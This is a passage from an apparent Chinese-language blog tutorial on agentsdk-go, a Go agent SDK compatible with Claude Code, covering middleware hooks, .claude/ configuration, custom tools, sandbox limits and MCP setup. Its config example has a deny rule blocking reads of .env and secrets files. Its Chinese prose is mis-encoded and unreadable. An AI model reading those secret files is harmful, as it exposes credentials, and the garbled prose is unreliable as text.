<li><strong>pkg/mcp</strong>ï¼šMCP (Model Context Protocol) å®¢æˆ·ç«¯ï¼Œæ¡¥æ¥å¤–éƒ¨å·¥å…·ï¼ˆstdio/SSEï¼‰</li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>pkg/sandbox</strong>ï¼šæ²™ç®±éš”ç¦»å±‚ï¼Œæ§åˆ¶æ–‡ä»¶ç³»ç»Ÿå’Œç½‘ç»œè®¿é—®ç­–ç•¥</li>
</ol>
</li>
<li>
<ol start="4">
<li><strong>pkg/runtime/skills</strong>ï¼šSkills ç®¡ç†ï¼Œæ”¯æŒè„šæœ¬åŠ è½½å’Œçƒ­é‡è½½</li>
</ol>
</li>
<li>
<ol start="5">
<li><strong>pkg/runtime/subagents</strong>ï¼šSubagent ç®¡ç†ï¼Œç”¨äºå¤š Agent ç¼–æ’å’Œè°ƒåº¦</li>
</ol>
</li>
<li>
<ol start="6">
<li><strong>pkg/runtime/commands</strong>ï¼šCommands è§£æå™¨ï¼Œå¤„ç†æ–œæ å‘½ä»¤è·¯ç”±å’Œå‚æ•°éªŒè¯</li>
</ol>
</li>
<li>
<ol start="7">
<li><strong>pkg/plugins</strong>ï¼šæ’ä»¶ç³»ç»Ÿï¼Œå…·å¤‡ç­¾åéªŒè¯å’Œç”Ÿå‘½å‘¨æœŸé’©å­</li>
</ol>
</li>
</ol>
<h5 data-id="heading-8">ä¸­é—´ä»¶æ‹¦æˆªç‚¹</h5>
<pre><code class="hljs language-markdown" lang="markdown">
<span class="hljs-code">    
    
    
  ç”¨æˆ·è¯·æ±‚
Â Â â†“
before_agentÂ Â â†Â è¯·æ±‚éªŒè¯ã€å®¡è®¡æ—¥å¿—
Â Â â†“
AgentÂ å¾ªç¯
Â Â â†“
before_modelÂ Â â†Â PromptÂ å¤„ç†ã€ä¸Šä¸‹æ–‡ä¼˜åŒ–
Â Â â†“
æ¨¡å‹è°ƒç”¨
Â Â â†“
after_modelÂ Â Â â†Â ç»“æœè¿‡æ»¤ã€å†…å®¹æ£€æŸ¥
Â Â â†“
before_toolÂ Â Â â†Â å·¥å…·å‚æ•°éªŒè¯
Â Â â†“
å·¥å…·æ‰§è¡Œ
Â Â â†“
after_toolÂ Â Â Â â†Â ç»“æœåå¤„ç†
Â Â â†“
after_agentÂ Â Â â†Â å“åº”æ ¼å¼åŒ–ã€æŒ‡æ ‡æ”¶é›†
Â Â â†“
ç”¨æˆ·å“åº”
</span></code></pre>
<p>è¿™ç§å…­å±‚æ‹¦æˆªè®¾è®¡å…è®¸å¼€å‘è€…åœ¨ Agent æ‰§è¡Œçš„å…³é”®èŠ‚ç‚¹æ³¨å…¥è‡ªå®šä¹‰é€»è¾‘ï¼Œå®ç°æ—¥å¿—è®°å½•ã€æ€§èƒ½ç›‘æ§ã€å®‰å…¨å®¡è®¡ç­‰åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-9">é…ç½®ç³»ç»Ÿ</h4>
<p>agentsdk-go ä½¿ç”¨ <code>.claude/</code> ç›®å½•è¿›è¡Œé…ç½®ï¼Œä¸ Claude Code å®Œå…¨å…¼å®¹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">
    
    
    
  .claude/
â”œâ”€â”€Â settings.jsonÂ Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">#Â é¡¹ç›®é…ç½®</span>
â”œâ”€â”€Â settings.local.jsonÂ Â Â Â Â <span class="hljs-comment">#Â æœ¬åœ°è¦†ç›–ï¼ˆgitignoredï¼‰</span>
â”œâ”€â”€Â skills/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">#Â SkillsÂ å®šä¹‰</span>
â”œâ”€â”€Â commands/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">#Â æ–œæ å‘½ä»¤å®šä¹‰</span>
â”œâ”€â”€Â agents/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">#Â SubagentsÂ å®šä¹‰</span>
â””â”€â”€Â plugins/Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-comment">#Â æ’ä»¶ç›®å½•</span>
</code></pre>
<p>é…ç½®ä¼˜å…ˆçº§ï¼ˆä»é«˜åˆ°ä½ï¼‰ï¼š</p>
<ol>
<li>
<ol>
<li>æ‰˜ç®¡ç­–ç•¥ï¼ˆ<code>/etc/claude-code/managed-settings.json</code>ï¼‰</li>
</ol>
</li>
<li>
<ol start="2">
<li>è¿è¡Œæ—¶è¦†ç›–ï¼ˆCLI/API æä¾›ï¼‰</li>
</ol>
</li>
<li>
<ol start="3">
<li><code>.claude/settings.local.json</code></li>
</ol>
</li>
<li>
<ol start="4">
<li><code>.claude/settings.json</code></li>
</ol>
</li>
<li>
<ol start="5">
<li>å†…ç½®é»˜è®¤å€¼</li>
</ol>
</li>
</ol>
<p>é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-json" lang="json">
    
    
    
  <span class="hljs-punctuation">{</span>
Â Â <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">{</span>
Â Â Â Â <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">[</span><span class="hljs-string">"Bash(ls:*)"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"Bash(pwd:*)"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
Â Â Â Â <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">[</span><span class="hljs-string">"Read(.env)"</span><span class="hljs-punctuation">,</span>Â <span class="hljs-string">"Read(secrets/**)"</span><span class="hljs-punctuation">]</span>
Â Â <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">{</span>
Â Â Â Â <span class="hljs-attr">"MY_VAR"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"value"</span>
Â Â <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"sandbox"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">{</span>
Â Â Â Â <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
Â Â <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-10">äºŒã€ä¸ºä»€ä¹ˆè¦è‡ªå·±å†™ agentsdk-go</h3>
<h4 data-id="heading-11">LangGraph çš„æ¶æ„é—®é¢˜</h4>
<p>LangGraph è™½ç„¶åŠŸèƒ½å¼ºå¤§ï¼Œä½†å­˜åœ¨å‡ ä¸ªæ ¸å¿ƒç—›ç‚¹ï¼š</p>
<ol>
<li>
<ol>
<li><strong>é»‘ç›’æ¶æ„</strong>ï¼šçŠ¶æ€å›¾æŠ½è±¡è¿‡é‡ï¼Œéš¾ä»¥è¿½è¸ª Agent æ‰§è¡Œæµç¨‹ï¼Œè°ƒè¯•å›°éš¾</li>
</ol>
</li>
<li>
<ol start="2">
<li><strong>çµæ´»æ€§ä¸è¶³</strong>ï¼šå›ºå®šçš„å›¾ç»“æ„é™åˆ¶äº†åŠ¨æ€å†³ç­–å’Œè¿è¡Œæ—¶è°ƒæ•´</li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>å·¥ç¨‹èƒ½åŠ›ç¼ºå¤±</strong>ï¼šç¼ºå°‘ Sandboxã€Hooksã€MCP ç­‰ç”Ÿäº§ç¯å¢ƒå¿…éœ€çš„èƒ½åŠ›</li>
</ol>
</li>
<li>
<ol start="4">
<li><strong>Python ç”Ÿæ€ç»‘å®š</strong>ï¼šå¯¹ Go ç”Ÿæ€æ”¯æŒä¸ä½³</li>
</ol>
</li>
</ol>
<h4 data-id="heading-12">Claude Agent SDK çš„èµ„æºç“¶é¢ˆ</h4>
<p>Claude Agent SDK åŸºäº <code>claude -p</code> å®ç°ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½ä¼šåœ¨æœ¬åœ°å¯åŠ¨ä¸€ä¸ªå®Œæ•´çš„ Claude å®ä¾‹ï¼š</p>
<ul>
<li>â€¢ <strong>CPU å ç”¨</strong>ï¼šæ¯ä¸ªå®ä¾‹ç‹¬ç«‹è¿›ç¨‹ï¼Œå¤šä»»åŠ¡å¹¶å‘æ—¶ CPU é£™å‡</li>
<li>â€¢ <strong>å†…å­˜æ¶ˆè€—</strong>ï¼šæ¯ä¸ªå®ä¾‹åŠ è½½å®Œæ•´ä¸Šä¸‹æ–‡ï¼Œå†…å­˜å ç”¨çº¿æ€§å¢é•¿</li>
<li>â€¢ <strong>å¯åŠ¨å»¶è¿Ÿ</strong>ï¼šè¿›ç¨‹å†·å¯åŠ¨æ—¶é—´å½±å“å“åº”é€Ÿåº¦</li>
</ul>
<p>è¿™åœ¨ CI/CD å’Œé«˜å¹¶å‘åœºæ™¯ä¸‹å®Œå…¨ä¸å¯æ¥å—ã€‚</p>
<h4 data-id="heading-13">agentsdk-go çš„ä¼˜åŠ¿</h4>
<h5 data-id="heading-14">1. æ¶æ„é€æ˜æ€§</h5>
<p>å®Œå…¨éµå¾ª Claude Code çš„è®¾è®¡åŸåˆ™ï¼Œæ ¸å¿ƒ Agent å¾ªç¯ä»… 189 è¡Œï¼Œé€»è¾‘æ¸…æ™°ï¼š</p>
<ul>
<li>â€¢ è¯·æ±‚æ¥æ”¶ â†’ ä¸­é—´ä»¶å‰ç½®å¤„ç† â†’ æ¨¡å‹è°ƒç”¨ â†’ å·¥å…·æ‰§è¡Œ â†’ ä¸­é—´ä»¶åç½®å¤„ç† â†’ å“åº”è¿”å›</li>
<li>â€¢ æ¯ä¸ªç¯èŠ‚éƒ½å¯æ‹¦æˆªã€è§‚æµ‹ã€è°ƒè¯•</li>
</ul>
<h5 data-id="heading-15">2. èµ„æºæ•ˆç‡</h5>
<ul>
<li>â€¢ <strong>å•è¿›ç¨‹æ¨¡å‹</strong>ï¼šæ‰€æœ‰ Agent å…±äº«ä¸€ä¸ªè¿è¡Œæ—¶ï¼Œæ— è¿›ç¨‹å¯åŠ¨å¼€é”€</li>
<li>â€¢ <strong>ä¼šè¯ç¼“å­˜</strong>ï¼šåŸºäº LRU çš„æ¶ˆæ¯å†å²ç®¡ç†ï¼Œé¿å…é‡å¤ä¸Šä¸‹æ–‡åŠ è½½</li>
<li>â€¢ <strong>æŒ‰éœ€åŠ è½½</strong>ï¼šSkillsã€Pluginsã€MCP å·¥å…·ä»…åœ¨ä½¿ç”¨æ—¶åˆå§‹åŒ–</li>
</ul>
<h5 data-id="heading-16">3. æ‰©å±•èƒ½åŠ›</h5>
<ul>
<li>â€¢ <strong>ä¸­é—´ä»¶ç³»ç»Ÿ</strong>ï¼šå…­å±‚æ‹¦æˆªç‚¹è¦†ç›–å®Œæ•´ç”Ÿå‘½å‘¨æœŸ</li>
<li>â€¢ <strong>Sandbox ä¼˜åŒ–</strong>ï¼šæ›´ç»†ç²’åº¦çš„èµ„æºæ§åˆ¶ï¼ˆCPUã€å†…å­˜ã€ç£ç›˜ã€ç½‘ç»œï¼‰</li>
<li>â€¢ <strong>è‡ªå®šä¹‰å·¥å…·</strong>ï¼šç®€å•çš„ <code>tool.Tool</code> æ¥å£ï¼Œ5 åˆ†é’Ÿå®Œæˆé›†æˆ</li>
</ul>
<h5 data-id="heading-17">4. ç”Ÿäº§å°±ç»ª</h5>
<ul>
<li>â€¢ <strong>é«˜æµ‹è¯•è¦†ç›–ç‡</strong>ï¼šæ ¸å¿ƒæ¨¡å— 90%+ è¦†ç›–ï¼Œä¿è¯ä»£ç è´¨é‡</li>
<li>â€¢ <strong>HTTP API</strong>ï¼šå†…ç½® REST + SSE æœåŠ¡å™¨ï¼Œå¼€ç®±å³ç”¨</li>
<li>â€¢ <strong>å¯è§‚æµ‹æ€§</strong>ï¼šTraceã€Metricsã€Logs å®Œæ•´æ”¯æŒ</li>
</ul>
<h3 data-id="heading-18">ä¸‰ã€å¦‚ä½•ä½¿ç”¨ agentsdk-go å¼€å‘ Agent</h3>
<h4 data-id="heading-19">å®‰è£…å’Œç¯å¢ƒå‡†å¤‡</h4>
<h5 data-id="heading-20">å‰ç½®è¦æ±‚</h5>
<ul>
<li>â€¢ Go 1.24.0 æˆ–æ›´é«˜ç‰ˆæœ¬</li>
<li>â€¢ Anthropic API Key</li>
</ul>
<h5 data-id="heading-21">å®‰è£… SDK</h5>
<pre><code class="hljs language-go" lang="go">
    
    
    
  <span class="hljs-keyword">go</span>Â getÂ github.com/cexll/agentsdk-<span class="hljs-keyword">go</span>
</code></pre>
<h4 data-id="heading-22">åŸºç¡€ç¤ºä¾‹ï¼š5 åˆ†é’Ÿåˆ›å»ºç¬¬ä¸€ä¸ª Agent</h4>
<p>è¿™æ˜¯æ¥è‡ª <code>examples/01-basic/main.go</code> çš„æœ€å°ç¤ºä¾‹ï¼Œå±•ç¤ºäº† agentsdk-go çš„æ ¸å¿ƒç”¨æ³•ï¼š</p>
<pre><code class="hljs language-go" lang="go">
    
    
    
  <span class="hljs-keyword">package</span>Â main

<span class="hljs-keyword">import</span>Â (
Â Â Â Â <span class="hljs-string">"context"</span>
Â Â Â Â <span class="hljs-string">"fmt"</span>
Â Â Â Â <span class="hljs-string">"log"</span>

Â Â Â Â <span class="hljs-string">"github.com/cexll/agentsdk-go/pkg/api"</span>
Â Â Â Â <span class="hljs-string">"github.com/cexll/agentsdk-go/pkg/middleware"</span>
Â Â Â Â modelpkgÂ <span class="hljs-string">"github.com/cexll/agentsdk-go/pkg/model"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span>Â <span class="hljs-title">main</span><span class="hljs-params">()</span></span>Â {
Â Â Â Â <span class="hljs-comment">//Â åˆ›å»ºÂ AnthropicÂ provider</span>
Â Â Â Â providerÂ :=Â &amp;modelpkg.AnthropicProvider{
Â Â Â Â Â Â Â Â ModelName:Â <span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â åˆå§‹åŒ–è¿è¡Œæ—¶</span>
Â Â Â Â traceMWÂ :=Â middleware.NewTraceMiddleware(<span class="hljs-string">".trace"</span>)
Â Â Â Â rt,Â errÂ :=Â api.New(context.Background(),Â api.Options{
Â Â Â Â Â Â Â Â ModelFactory:Â provider,
Â Â Â Â Â Â Â Â Middleware:Â Â Â []middleware.Middleware{traceMW},
Â Â Â Â })
Â Â Â Â <span class="hljs-keyword">if</span>Â errÂ !=Â <span class="hljs-literal">nil</span>Â {
Â Â Â Â Â Â Â Â log.Fatalf(<span class="hljs-string">"buildÂ runtime:Â %v"</span>,Â err)
Â Â Â Â }
Â Â Â Â <span class="hljs-keyword">defer</span>Â rt.Close()

Â Â Â Â <span class="hljs-comment">//Â å‘èµ·åŒæ­¥è°ƒç”¨</span>
Â Â Â Â resp,Â errÂ :=Â rt.Run(context.Background(),Â api.Request{
Â Â Â Â Â Â Â Â Prompt:Â <span class="hljs-string">"ä½ å¥½"</span>,
Â Â Â Â })
Â Â Â Â <span class="hljs-keyword">if</span>Â errÂ !=Â <span class="hljs-literal">nil</span>Â {
Â Â Â Â Â Â Â Â log.Fatalf(<span class="hljs-string">"run:Â %v"</span>,Â err)
Â Â Â Â }

Â Â Â Â <span class="hljs-keyword">if</span>Â resp.ResultÂ !=Â <span class="hljs-literal">nil</span>Â {
Â Â Â Â Â Â Â Â fmt.Println(resp.Result.Output)
Â Â Â Â }
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ol>
<li>
<ol>
<li><strong>æ¨¡å‹åˆå§‹åŒ–</strong>ï¼šé€šè¿‡ <code>AnthropicProvider</code> é…ç½®æ¨¡å‹</li>
</ol>
</li>
<li>
<ol start="2">
<li><strong>ä¸­é—´ä»¶æ³¨å…¥</strong>ï¼š<code>TraceMiddleware</code> è‡ªåŠ¨è®°å½•æ‰§è¡Œæ—¥å¿—åˆ° <code>.trace</code> ç›®å½•</li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>è¿è¡Œæ—¶åˆ›å»º</strong>ï¼š<code>api.New()</code> åˆå§‹åŒ–å®Œæ•´è¿è¡Œæ—¶</li>
</ol>
</li>
<li>
<ol start="4">
<li><strong>åŒæ­¥è°ƒç”¨</strong>ï¼š<code>rt.Run()</code> é˜»å¡ç­‰å¾…ç»“æœ</li>
</ol>
</li>
</ol>
<p>è¿è¡Œç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">
    
    
    
  <span class="hljs-comment">#Â 1.Â è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="hljs-built_in">export</span>Â ANTHROPIC_API_KEY=sk-ant-your-key-here

<span class="hljs-comment">#Â 2.Â è¿è¡Œç¤ºä¾‹</span>
goÂ runÂ ./examples/01-basic
</code></pre>
<h4 data-id="heading-23">è¿›é˜¶ç”¨æ³•ï¼šè‡ªå®šä¹‰ä¸­é—´ä»¶</h4>
<p>ä¸­é—´ä»¶æ˜¯ agentsdk-go çš„æ ¸å¿ƒæ‰©å±•æœºåˆ¶ï¼Œå…è®¸åœ¨å…­ä¸ªå…³é”®èŠ‚ç‚¹æ³¨å…¥é€»è¾‘ï¼š</p>
<pre><code class="hljs language-go" lang="go">
    
    
    
  loggingMiddlewareÂ :=Â middleware.Middleware{
Â Â Â Â <span class="hljs-comment">//Â è¯·æ±‚å‰ï¼šè®°å½•è¾“å…¥å’Œå¯åŠ¨æ—¶é—´</span>
Â Â Â Â BeforeAgent:Â <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctxÂ context.Context,Â reqÂ *middleware.AgentRequest)</span></span>Â (*middleware.AgentRequest,Â <span class="hljs-type">error</span>)Â {
Â Â Â Â Â Â Â Â log.Printf(<span class="hljs-string">"[REQUEST]Â %s"</span>,Â req.Input)
Â Â Â Â Â Â Â Â req.Meta[<span class="hljs-string">"start_time"</span>]Â =Â time.Now()
Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â req,Â <span class="hljs-literal">nil</span>
Â Â Â Â },

Â Â Â Â <span class="hljs-comment">//Â å“åº”åï¼šè®¡ç®—æ‰§è¡Œæ—¶é—´</span>
Â Â Â Â AfterAgent:Â <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctxÂ context.Context,Â respÂ *middleware.AgentResponse)</span></span>Â (*middleware.AgentResponse,Â <span class="hljs-type">error</span>)Â {
Â Â Â Â Â Â Â Â durationÂ :=Â time.Since(resp.Meta[<span class="hljs-string">"start_time"</span>].(time.Time))
Â Â Â Â Â Â Â Â log.Printf(<span class="hljs-string">"[RESPONSE]Â %sÂ (elapsed:Â %v)"</span>,Â resp.Output,Â duration)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â resp,Â <span class="hljs-literal">nil</span>
Â Â Â Â },

Â Â Â Â <span class="hljs-comment">//Â æ¨¡å‹è°ƒç”¨å‰ï¼šä¼˜åŒ–Â Prompt</span>
Â Â Â Â BeforeModel:Â <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctxÂ context.Context,Â reqÂ *middleware.ModelRequest)</span></span>Â (*middleware.ModelRequest,Â <span class="hljs-type">error</span>)Â {
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â æ·»åŠ ç³»ç»Ÿæç¤ºè¯</span>
Â Â Â Â Â Â Â Â req.MessagesÂ =Â <span class="hljs-built_in">append</span>([]middleware.Message{
Â Â Â Â Â Â Â Â Â Â Â Â {Role:Â <span class="hljs-string">"system"</span>,Â Content:Â <span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªæŠ€æœ¯ä¸“å®¶"</span>},
Â Â Â Â Â Â Â Â },Â req.Messages...)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â req,Â <span class="hljs-literal">nil</span>
Â Â Â Â },

Â Â Â Â <span class="hljs-comment">//Â å·¥å…·æ‰§è¡Œå‰ï¼šå‚æ•°éªŒè¯</span>
Â Â Â Â BeforeTool:Â <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctxÂ context.Context,Â reqÂ *middleware.ToolRequest)</span></span>Â (*middleware.ToolRequest,Â <span class="hljs-type">error</span>)Â {
Â Â Â Â Â Â Â Â log.Printf(<span class="hljs-string">"[TOOL]Â %sÂ withÂ params:Â %v"</span>,Â req.Name,Â req.Parameters)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â req,Â <span class="hljs-literal">nil</span>
Â Â Â Â },
}

<span class="hljs-comment">//Â æ³¨å…¥ä¸­é—´ä»¶</span>
runtime,Â errÂ :=Â api.New(ctx,Â api.Options{
Â Â Â Â ProjectRoot:Â Â <span class="hljs-string">"."</span>,
Â Â Â Â ModelFactory:Â provider,
Â Â Â Â Middleware:Â Â Â []middleware.Middleware{loggingMiddleware},
})
</code></pre>
<h4 data-id="heading-24">æµå¼è¾“å‡ºï¼šå®æ—¶è·å– Agent æ‰§è¡Œè¿›åº¦</h4>
<p>å¯¹äºé•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡ï¼Œæµå¼ API æä¾›å®æ—¶åé¦ˆï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">
    
    
    
  eventsÂ :=Â runtime.RunStream(ctx,Â api.Request{
Â Â Â Â Prompt:Â Â Â Â <span class="hljs-string">"åˆ†æä»£ç ä»“åº“ç»“æ„å¹¶ç”ŸæˆæŠ¥å‘Š"</span>,
Â Â Â Â SessionID:Â <span class="hljs-string">"analysis"</span>,
})

<span class="hljs-keyword">for</span>Â <span class="hljs-keyword">event</span>Â :=Â rangeÂ eventsÂ {
Â Â Â Â <span class="hljs-keyword">switch</span>Â <span class="hljs-keyword">event</span>.TypeÂ {
Â Â Â Â <span class="hljs-keyword">case</span>Â <span class="hljs-string">"content_block_delta"</span>:
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â è¾“å‡ºæ–‡æœ¬å†…å®¹</span>
Â Â Â Â Â Â Â Â fmt.Print(<span class="hljs-keyword">event</span>.Delta.Text)

Â Â Â Â <span class="hljs-keyword">case</span>Â <span class="hljs-string">"tool_execution_start"</span>:
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â å·¥å…·å¼€å§‹æ‰§è¡Œ</span>
Â Â Â Â Â Â Â Â fmt.Printf(<span class="hljs-string">"\n[å·¥å…·æ‰§è¡Œ]Â %s\n"</span>,Â <span class="hljs-keyword">event</span>.ToolName)

Â Â Â Â <span class="hljs-keyword">case</span>Â <span class="hljs-string">"tool_execution_stop"</span>:
Â Â Â Â Â Â Â Â <span class="hljs-comment">//Â å·¥å…·æ‰§è¡Œå®Œæˆ</span>
Â Â Â Â Â Â Â Â fmt.Printf(<span class="hljs-string">"[å·¥å…·ç»“æœ]Â %s\n"</span>,Â <span class="hljs-keyword">event</span>.Output)
Â Â Â Â }
}
</code></pre>
<h4 data-id="heading-25">è‡ªå®šä¹‰å·¥å…·ï¼šæ‰©å±• Agent èƒ½åŠ›</h4>
<p>agentsdk-go å…è®¸æ³¨å†Œè‡ªå®šä¹‰å·¥å…·ï¼Œæ¥å£éå¸¸ç®€æ´ï¼ˆå‚è€ƒ <code>examples/05-custom-tools/main.go</code>ï¼‰ï¼š</p>
<pre><code class="hljs language-go" lang="go">
    
    
    
  <span class="hljs-comment">//Â å®šä¹‰è‡ªå®šä¹‰å·¥å…·</span>
<span class="hljs-keyword">type</span>Â EchoToolÂ <span class="hljs-keyword">struct</span>{}

<span class="hljs-function"><span class="hljs-keyword">func</span>Â <span class="hljs-params">(tÂ *EchoTool)</span></span>Â Name()Â <span class="hljs-type">string</span>Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-string">"echo"</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span>Â <span class="hljs-params">(tÂ *EchoTool)</span></span>Â Description()Â <span class="hljs-type">string</span>Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-string">"è¿”å›æä¾›çš„æ–‡æœ¬"</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span>Â <span class="hljs-params">(tÂ *EchoTool)</span></span>Â Schema()Â *tool.JSONSchemaÂ {
Â Â Â Â <span class="hljs-keyword">return</span>Â &amp;tool.JSONSchema{
Â Â Â Â Â Â Â Â Type:Â <span class="hljs-string">"object"</span>,
Â Â Â Â Â Â Â Â Properties:Â <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any{
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"text"</span>:Â <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any{
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"type"</span>:Â Â Â Â Â Â Â Â <span class="hljs-string">"string"</span>,
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-string">"description"</span>:Â <span class="hljs-string">"è¦è¿”å›çš„æ–‡æœ¬"</span>,
Â Â Â Â Â Â Â Â Â Â Â Â },
Â Â Â Â Â Â Â Â },
Â Â Â Â Â Â Â Â Required:Â []<span class="hljs-type">string</span>{<span class="hljs-string">"text"</span>},
Â Â Â Â }
}

<span class="hljs-function"><span class="hljs-keyword">func</span>Â <span class="hljs-params">(tÂ *EchoTool)</span></span>Â Execute(ctxÂ context.Context,Â paramsÂ <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any)Â (*tool.ToolResult,Â <span class="hljs-type">error</span>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â &amp;tool.ToolResult{
Â Â Â Â Â Â Â Â Output:Â fmt.Sprint(params[<span class="hljs-string">"text"</span>]),
Â Â Â Â },Â <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">//Â æ³¨å†Œå·¥å…·</span>
rt,Â errÂ :=Â api.New(ctx,Â api.Options{
Â Â Â Â ProjectRoot:Â Â Â Â Â Â Â Â Â <span class="hljs-string">"."</span>,
Â Â Â Â ModelFactory:Â Â Â Â Â Â Â Â provider,
Â Â Â Â EnabledBuiltinTools:Â []<span class="hljs-type">string</span>{<span class="hljs-string">"bash"</span>,Â <span class="hljs-string">"file_read"</span>},Â <span class="hljs-comment">//Â é€‰æ‹©æ€§å¯ç”¨å†…ç½®å·¥å…·</span>
Â Â Â Â CustomTools:Â Â Â Â Â Â Â Â Â []tool.Tool{&amp;EchoTool{}},Â Â Â Â Â Â <span class="hljs-comment">//Â æ·»åŠ è‡ªå®šä¹‰å·¥å…·</span>
})
</code></pre>
<p><strong>å·¥å…·æ³¨å†Œè§„åˆ™</strong>ï¼š</p>
<ul>
<li>â€¢ <code>EnabledBuiltinTools: nil</code> â†’ å¯ç”¨æ‰€æœ‰å†…ç½®å·¥å…·</li>
<li>â€¢ <code>EnabledBuiltinTools: []string{}</code> â†’ ç¦ç”¨æ‰€æœ‰å†…ç½®å·¥å…·</li>
<li>â€¢ <code>EnabledBuiltinTools: []string{"bash", "file_read"}</code> â†’ ä»…å¯ç”¨æŒ‡å®šå·¥å…·ï¼ˆå¤§å°å†™ä¸æ•æ„Ÿï¼‰</li>
<li>â€¢ <code>CustomTools</code> â†’ è¿½åŠ è‡ªå®šä¹‰å·¥å…·</li>
</ul>
<h4 data-id="heading-26">é«˜çº§ç‰¹æ€§ï¼šå®Œæ•´å·¥ç¨‹èƒ½åŠ›</h4>
<p><code>examples/04-advanced</code> å±•ç¤ºäº†ç”Ÿäº§ç¯å¢ƒæ‰€éœ€çš„å…¨éƒ¨åŠŸèƒ½ï¼š</p>
<h5 data-id="heading-27">1. Sandbox éš”ç¦»</h5>
<pre><code class="hljs language-go" lang="go">
    
    
    
  optsÂ :=Â api.Options{
Â Â Â Â Sandbox:Â &amp;sandbox.Options{
Â Â Â Â Â Â Â Â Enabled:Â Â Â Â Â <span class="hljs-literal">true</span>,
Â Â Â Â Â Â Â Â Root:Â Â Â Â Â Â Â Â <span class="hljs-string">"/app/workspace"</span>,
Â Â Â Â Â Â Â Â AllowedHosts:Â []<span class="hljs-type">string</span>{<span class="hljs-string">"api.example.com"</span>},
Â Â Â Â Â Â Â Â CPULimit:Â Â Â Â <span class="hljs-number">50.0</span>,Â Â <span class="hljs-comment">//Â CPUÂ ä½¿ç”¨ç‡é™åˆ¶Â 50%</span>
Â Â Â Â Â Â Â Â MemLimit:Â Â Â Â <span class="hljs-number">512</span>,Â Â Â <span class="hljs-comment">//Â å†…å­˜é™åˆ¶Â 512MB</span>
Â Â Â Â Â Â Â Â DiskLimit:Â Â Â <span class="hljs-number">1024</span>,Â Â <span class="hljs-comment">//Â ç£ç›˜é™åˆ¶Â 1GB</span>
Â Â Â Â },
}
</code></pre>
<h5 data-id="heading-28">2. MCP å·¥å…·é›†æˆ</h5>
<pre><code class="hljs language-css" lang="css">
    
    
    
  optsÂ :=Â api.Options{
Â Â Â Â MCPServers:Â []mcp.ServerConfig{
Â Â Â Â Â Â Â Â {
Â Â Â Â Â Â Â Â Â Â Â Â Name:Â Â Â Â <span class="hljs-string">"time-server"</span>,
Â Â Â Â Â Â Â Â Â Â Â Â Command:Â <span class="hljs-string">"uvx"</span>,
Â Â Â Â Â Â Â Â Â Â Â Â Args:Â Â Â Â []string{"mcp-server-<span class="hljs-selector-tag">time</span>"},
Â Â Â Â Â Â Â Â },
Â Â Â Â },
}
</code></pre>
<h5 data-id="heading-29">3. Skills å’Œ Subagents</h5>
<pre><code class="hljs language-css" lang="css">
    
    
    
  optsÂ :=Â api.Options{
Â Â Â Â Skills:Â []skills.Skill{
